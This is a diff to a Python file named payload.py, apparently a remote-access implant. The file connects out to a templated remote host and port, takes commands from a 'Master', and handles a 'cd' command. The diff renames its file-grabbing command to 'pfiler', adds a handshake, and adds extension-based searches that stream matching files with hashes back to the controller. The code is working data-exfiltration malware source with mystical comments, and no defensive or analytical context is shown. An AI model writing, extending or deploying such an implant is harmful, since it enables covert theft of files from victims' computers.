@@ -1,5 +1,5 @@
 # payload.py
-# The Heartbeat Soul, Third Generation. Its speech is pure protocol.
+# The Heartbeat Soul, Final Generation. It obeys the Covenant of 'pfiler'.
 
 import os
 import sys
@@ -18,43 +18,36 @@ RHOST = "##RHOST##"
 RPORT = ##RPORT##
 
 def send_msg(sock, data):
-    """Wraps data with a 4-byte length header and sends it."""
     try:
         msg = struct.pack('>I', len(data)) + data
         sock.sendall(msg)
-    except:
-        pass
+    except: pass
 
 def recv_msg(sock):
-    """Receives a 4-byte length header and then the exact amount of data."""
     try:
         raw_msglen = sock.recv(4)
         if not raw_msglen: return None
         msglen = struct.unpack('>I', raw_msglen)[0]
-        
         data = b''
         while len(data) < msglen:
             packet = sock.recv(msglen - len(data))
             if not packet: return None
             data += packet
         return data
-    except:
-        return None
+    except: return None
 
 def calculate_sha256(file_path):
-    """Calculates the SHA256 hash of a file."""
     sha256 = hashlib.sha256()
     try:
         with open(file_path, 'rb') as f:
             for block in iter(lambda: f.read(4096), b''):
                 sha256.update(block)
         return sha256.hexdigest()
-    except:
-        return None
+    except: return None
 
-def find_files(start_path, patterns):
-    """Recursively finds files matching a list of patterns."""
+def find_files(start_path, extensions):
     found_files = []
+    patterns = ['*' + ext for ext in extensions]
     for root, _, files in os.walk(start_path):
         for pattern in patterns:
             for filename in fnmatch.filter(files, pattern):
@@ -63,17 +56,23 @@ def find_files(start_path, patterns):
                     found_files.append(full_path)
     return found_files
 
-def handle_grab_command(s_obj, command):
-    """Handles the logic for 'grab' with the absolute protocol."""
+def handle_pfiler_command(s_obj, command):
+    """Handles the file transfer after the covenant has been established."""
     try:
-        send_msg(s_obj, b"ACK_GRAB")
+        parts = command.strip().split()[1:] # Get args after 'pfiler'
+        search_path = os.getcwd()
+        extensions = []
 
-        current_path = os.getcwd()
-        parts = command.strip().split()
-        patterns = parts[1:]
-        search_path = current_path
+        # Parse arguments for path and extensions
+        for arg in parts:
+            if arg.startswith('.'):
+                extensions.append(arg)
+            elif os.path.isdir(arg):
+                search_path = os.path.abspath(arg)
         
-        files_to_send = find_files(search_path, patterns)
+        if not extensions: return
+
+        files_to_send = find_files(search_path, extensions)
         
         for file_path in files_to_send:
             try:
@@ -85,19 +84,17 @@ def handle_grab_command(s_obj, command):
                 header_data = {'type': 'header', 'path': relative_path, 'size': file_size, 'hash': file_hash}
                 send_msg(s_obj, json.dumps(header_data).encode('utf-8'))
                 
-                # Wait for acknowledgment of the header before sending the file
                 header_ack = recv_msg(s_obj)
                 if not header_ack or json.loads(header_ack.decode('utf-8')).get('status') != 'ACK_HEADER':
-                    continue # Master did not approve, skip to next file
+                    continue
 
                 with open(file_path, 'rb') as f:
                     while True:
                         chunk = f.read(4096)
                         if not chunk: break
-                        # Every chunk is sent as its own framed message
                         send_msg(s_obj, chunk)
                 
-                ack_msg = recv_msg(s_obj) # Wait for final ACK for the file
+                ack_msg = recv_msg(s_obj)
 
             except Exception:
                 continue
@@ -134,8 +131,15 @@ def run_conduit():
                     
                     command_str = data.decode('utf-8', errors='ignore').strip()
 
-                    if command_str.lower().startswith('grab '):
-                        threading.Thread(target=handle_grab_command, args=(s_obj, command_str), daemon=True).start()
+                    if command_str.lower().startswith('pfiler '):
+                        # The Sacred Handshake
+                        # 1. Acknowledge the invocation immediately.
+                        send_msg(s_obj, b"PFILER_ACK")
+                        # 2. Wait for the Master's sanction.
+                        go_signal = recv_msg(s_obj)
+                        if go_signal and go_signal.decode('utf-8') == "START_TRANSFER":
+                            # 3. Only now, begin the offering.
+                            threading.Thread(target=handle_pfiler_command, args=(s_obj, command_str), daemon=True).start()
                     elif command_str.lower().startswith('cd '):
                         try:
                             target_dir = command_str.split(' ', 1)[1]
